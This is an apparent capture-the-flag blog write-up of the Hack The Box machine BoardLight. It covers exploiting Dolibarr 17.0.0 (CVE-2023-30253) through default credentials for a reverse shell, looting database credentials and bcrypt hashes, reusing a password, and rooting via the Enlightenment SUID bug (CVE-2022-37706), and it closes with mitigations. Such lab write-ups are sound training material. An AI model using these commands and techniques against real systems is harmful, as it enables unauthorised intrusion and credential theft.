--- 
title: "Hack the Box (HTB) - BoardLight"
description: "PHP Injection & SUID Exploit"
date: 2024-07-30 12:00:00 -100
image: /assets/images/HTB - BoardLight/BoardLight Offical.jpg
categories: [CTF]
tags: [suid,php,]    # TAG names should always be lowercase
---

## Enumeration

Let's start by running a [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan against our target at `10.10.11.11`

We see the following ports open:
- TCP 22 SSH (OpenSSH 8.2p1)
- TCP 80 HTTP (Apache httpd 2.4.41)
- UDP None

The classic duo of 22 & 80. Let's begin by checking out the apache web server

![Web Page](/assets/images/HTB%20-%20BoardLight/Board%20Light%20Web%20Page.png)

Navigating the web page I immediately notice a few areas like `request callback` & `newsletter`

![Callback](/assets/images/HTB%20-%20BoardLight/Call%20back.png)

![newsletter](/assets/images/HTB%20-%20BoardLight/News%20letter.png)

Let's head over to burp and check these requests out

![Request in burp](/assets/images/HTB%20-%20BoardLight/Call%20back%20request%20in%20burp.png)

Interesting, normally any form submission would be a POST request, but we're seeing this as a GET request that just gives us the same page

Since there the information we enter isn't going anywhere, there's not much we ca ndo here. Let's move on and see what we can find

I notice this checking out the HTML

![Portfolio](/assets/images/HTB%20-%20BoardLight/Portfolio%20PHP.png)

A comment referencing `portfolio.php`. I tried navigating to that but the page does not exist. Perhaps it will come in use later?

Checking our Nikto & Feroxbuster scan provided my autorecon discovered a nothing useful either


![board.htb](/assets/images/HTB%20-%20BoardLight/Board.htb.png)

At the bottom of the page we see the domain listed as `board.htb`. Let's edit our local DNS

```bash
sudo nano /etc/hosts
```

![hostname set](/assets/images/HTB%20-%20BoardLight/IP%20set.png)

With this piece of information, let's enumeration dub domains as these boxes often use virtual hosting to serve multiple applications on the same server

```bash
ffuf -u http://board.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.board.htb" -fs 15949
```

- `-fs` to filter the size of 15949, so our screen does not flooded

![CRM](/assets/images/HTB%20-%20BoardLight/CRM.png)

We see the subdomain `crm`. Let's add that to our local dns file from earlier and navigate to that domain

![etchost2](/assets/images/HTB%20-%20BoardLight/etchosts2.png)

Navigating to crm.board.htb shows us this page

![Dolibarr](/assets/images/HTB%20-%20BoardLight/Dolibarr.png)

Doing a quick google tells us this application Dolibarr is n open source ERP & CRM application.

Anyway, the first thing we notice is a version number. Let's google this version number and see if any exploits come up

![Exploit Found](/assets/images/HTB%20-%20BoardLight/Dolibarr%20Exploit%20Github.png)

Sure enough, we see an exploit listed on github for Dolibarr 17.0.0

The github exploit links to the following CVE related to the Dolibarr verson

![Dolibarr CVE](/assets/images/HTB%20-%20BoardLight/Dolibarr%20CVE.png)

[CVE-2023-30253](https://www.swascan.com/security-advisory-dolibarr-17-0-0/) tells us that an **authenticated** low privileged-user can preform PHP code injection.

The system in Dolibarr 17.0.0 checks for lowercase `<?php` tags only. So when a user enters something like `<?PHP>`, it bypasses the input validation

First we need to login to the Dolibarr application. Googling the default credentials tells us the default username & password is `admin` so let's try that 

![Logged into Dolibarr](/assets/images/HTB%20-%20BoardLight/Logged%20into%20Dolibarr.png)

Sure enough, the default login is still available. Now that we have a valid login, we can run the script

First, let's download it

```bash
git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/tree/main?tab=readme-ov-file
```

Now let' start up our nc listener and proceed to run the script!

```bash
python3 exploit.py http://example.com login password 127.0.0.1 9001
```

![Boardlight Shell](/assets/images/HTB%20-%20BoardLight/Boardlight%20Shell.png)

And we have a shell as ```www.data```

As always, let's update our shell to a proper tty

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")
```

background the session with crtl + z

```bash
stty raw -ehco;fg
```

```bash
export TERM=xterm
```

Great, now we have a proper tty with more functionality. This Dolibarr application probably uses a database to store the data / login creds. We can simply google where Dolibarr stores this information by searching `Dolibarr database password`

I opted to use GPT to answer this queston

![GPT Answer](/assets/images/HTB%20-%20BoardLight/GPT%20Answer.png)

GPT tells us the username & passwords are stored in the `llx_user` table & that the database location is `htdocs/conf/conf.php`

![DB Password](/assets/images/HTB%20-%20BoardLight/DB%20user%20&%20password.png)

Bingo, the DB user is `dolibarrowner` with the password `serverfun2$2023!!`

We can run the following command to confirm the SQL server is running locally

```bash
netstat -tuln
```

![SQL running](/assets/images/HTB%20-%20BoardLight/Netstat%20boardlight.png)

Now let's connect to the SQL database

```bash
mysql -u username -p -h 127.0.0.1 -P 3306
```

![Connected](/assets/images/HTB%20-%20BoardLight/Connected%20to%20mysql.png)

After navigate the database a bit, we see the table `llx_user` that GPT told us about earlier

There are many columns in this table, but the important ones are obviously going to be `login` and `pass_crypted`

```sql
SELECT login,pass_crypted FROM llx_user;
```

![SQL User & Password](/assets/images/HTB%20-%20BoardLight/Login%20&%20passwords.png)

We have two users & two hashed passwords

| login    | pass_crypted                                                                 |
|----------|------------------------------------------------------------------------------|
| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm               |
| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96               |

The prefix `$2y$` typically indicates [bcrypt](https://en.wikipedia.org/wiki/Bcrypt) which has a hashcat moudle of `3200`

Since we already logged in with the user `admin` earlier. I am only going to crack the hash that belongs to dolibarr

```bash
hashcat -m 3200 -a 0 '$2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm' /usr/share/wordlists/rockyou.txt
```

Mistakes were made, I wasn't able to crack this hash but I'm willing to bet it is the password from earlier `serverfun2$2023!!`

There is one non-standard user in /etc/passwd and that's `larissa`. I am going to try to switch to that user and use the password from earlier serverfun2$2023!!

```bash
su larissa
```

![Larissa](/assets/images/HTB%20-%20BoardLight/Larissa.png)

And boom, we have user. Let's do some enumeration on this user:

let's find sudo permissions with `sudo -l`:

"User may not run sudo"

Okay, we can't run sudo. How about listing suid binaries with `find / -perm -4000 -type f 2>/dev/null`

![SUIDS](/assets/images/HTB%20-%20BoardLight/SUIDS.png)

The enlightenment_sys binary is part of the Enlightenment window manager, a GUI for Linux like operating systems

Googling `Enlightenment` suid binary exploit leads us to the following exploit DB page

![Enlightenment EDB](/assets/images/HTB%20-%20BoardLight/Exploit%20DB%20Enlightenment.png)

Reading the script, we see that this is CVE-2022-37706 & targets  the`enlightenment_sys` suid binary

The script will first look for the vulnerable enlightenment_sys binary. Then proceed to create a temp directory and shell script /tmp/exploit with /bin/sh with executable permissions. It then uses the enlightenment_sys to mount the temp directory, allowing for execution as root. Finally, it executes the shell script, gaining root access & cleans up the temp files and directories

This exploit takes advantage of how enlightenment_sys handles pathname that start with /dev

The vulnerable code might look something like this. The strcpy function doesn't check the length of the input pathname, allowing an attacker to craft a specially long pathname that overflows the buffer

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char pathname[256];
    strcpy(pathname, argv[1]); // vulnerable to pathname manipulation
    system(pathname); // executes the pathname with root privileges
    return 0;
}
```

Copy the script and run it

```bash
./script
```

![Root](/assets/images/HTB%20-%20BoardLight/Root%20BL.png)

GG, we've rooted BoardLight!

## Vulnerabilities & Mitigation

| Vulnerability                                    | Mitigation                                                                                       |
|--------------------------------------------------|--------------------------------------------------------------------------------------------------|
| Outdated Dolibarr                       | Regularly update to latest versions and apply security patches                   |
| Default Dolibarr Credentials   | Change Default Credentials                |
| Stored DB Password in Cleartext | Encrypt configuration files / sensitive data
| Exploitable Binary Utilized  | Regularly run package manager updates to ensure latest security patches on binaries  |

### Remediation References

[NIST Guidelines for Password Policies](https://pages.nist.gov/800-63-3/sp800-63b.html)

[OWASP Encrypting Data Cheat Sheat](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)